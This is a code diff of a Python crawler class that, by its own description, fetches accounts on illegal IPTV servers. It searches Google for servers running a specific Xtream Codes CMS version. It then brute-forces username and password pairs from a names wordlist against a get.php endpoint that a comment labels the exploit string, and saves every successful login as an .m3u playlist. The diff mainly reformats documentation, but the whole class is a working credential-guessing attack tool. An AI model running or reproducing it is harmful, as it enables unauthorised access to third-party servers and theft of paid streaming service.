@@ -8,63 +8,77 @@ from urlparse import urlparse
 
 """Crawler
 Class that handles the crawling process that fetch accounts on illegal IPTVs
-@author: Claudio Ludovico Panetta (@ludo237)
-@revision: Pinperepette (@Pinperepette)
+
+Authors:
+Claudio Ludovico (@Ludo237)
+Pinperepette (@Pinperepette)
 """
 class Crawler(object):
+    # output default directory
     outputDir = "output"
+    # language default directory
+    languageDir = "languages"
+    # string used to exploit the CMS
     basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
+    # string used to search the CMS
     searchString = "Xtream Codes v1.0.59.5"
 
-    """Default constructor
-    Language parameter allows us to understand what kind of names file we need to use
-    """
     def __init__(self, language = "it"):
+        """Default constructor
+
+        Keyword arguments:
+        language -- Language parameter allows us to understand what kind of
+                    names file we need to use. (default it)
+        """
         self.language = language.lower()
         self.parsedUrls = []
         self.foundedAccounts = 0
 
-    """Change Language
-    Set the language you want to use to brute force names
-    """
     def change_language(self, language = "it"):
-        # At the moment this will be hardcoded to IT because we don't have
-        # other lists...
-        self.language = "it"
-        return "Language changed"
+        """Set the language you want to use to brute force names
 
-    """Search Links
-    Print the first 30 links from a Google search
-    We set the limit of 30 links because this script serve as demonstration and it's
-    not intended to be use for personal purpose.
+        Keyword arguments:
+        language -- Language parameter allows us to understand what kind of
+                    names file we need to use. (default it)
 
-    The URLs will be printed on terminal screen without saving.
-    """
+        Return:
+        boolean -- true if the language file exists, otherwise false
+        """
+        if os.path.isfile(self.languageDir + "/" + language + ".txt"):
+            self.language = language
+            return True
+        else:
+            return False
+
     def search_links(self):
-        # 30 results and stop at the first page
+        """Print the first 30 links from a Web search
+
+        We set the limit of 30 links because this script serve as demonstration and it's
+        not intended to be use for personal purpose.
+        """
         for url in google.search(self.searchString, num=30, stop=1):
             parsed = urlparse(url)
             self.parsedUrls.append(parsed.scheme + "://" + parsed.netloc)
 
-    def add_links(self):
-        file = open("servers.txt", "r")
-        for url in file.readlines():
-            parsed = urlparse(url)
-            self.parsedUrls.append(parsed.scheme + "://" + parsed.netloc)
-
-    """Search Accounts
-    This is the core method. It will crawl the give url for any possible accounts
-    If we found any we will create a new directory under /output with the name
-    of the site plus every account as five .m3u. Please use VLC for opening that
-    kind of files
-    """
     def search_accounts(self, url = None):
+        """Search Accounts
+        This is the core method. It will crawl the give url for any possible accounts
+        If we found any we will create a new directory under /output with the name
+        of the site plus every account as five .m3u. Please use VLC for opening that
+        kind of files
+
+        Keyword arguments:
+        url -- an url from the fetched list. (default None)
+
+        Return:
+        string -- the status of the crawling session
+        """
         if not self.parsedUrls:
             return "You must fetch some URLs first"
         try:
             if not url:
                 url = random.choice(self.parsedUrls)
-            fileName = "names/" + self.language + ".txt"
+            fileName = self.languageDir + "/" + self.language + ".txt"
             fileLength = self.file_length(fileName)
             progressBar = pyprind.ProgBar(fileLength, title = "Fetching account from " + url + " this might take a while.", stream = 1, monitor = True)
             foundedAccounts = 0
@@ -100,12 +114,20 @@ class Crawler(object):
             else:
                 return "No results for " + url
 
-    """Create File
-    Once the parse founds something worth it, we need to create the .m3u file
-    to do so we except a newPath and the current row used from names file and also
-    the content from the fetched response
-    """
     def create_file(self, row, newPath, fetched):
+        """Create File
+        Once the parse founds something worth it, we need to create the .m3u file
+        to do so we except a newPath and the current row used from names file and also
+        the content from the fetched response
+
+        Keyword arguments:
+        row -- row of the language file, this allow us to understand which names
+        were useful for the brute force.
+
+        newPath -- The path that we use to store the current fetched accounts.
+
+        fetched -- the current response file from the attack.
+        """
         if os.path.exists(newPath) is False:
             os.makedirs(newPath)
         outputFile = open(str(newPath) + "/tv_channels_%s.m3u" % row.rstrip().lstrip(), "w")
@@ -113,10 +135,13 @@ class Crawler(object):
         self.foundedAccounts = self.foundedAccounts + 1
         outputFile.close()
 
-    """File Length
-    Cheapest way to calculate the rows of a file
-    """
     def file_length(self, fileName):
+        """File Length
+        Cheapest way to calculate the rows of a file
+
+        Keyword arguments:
+        fileName -- string the filename into which we will check its Length
+        """
         with open(fileName) as f:
             for i, l in enumerate(f):
                 pass
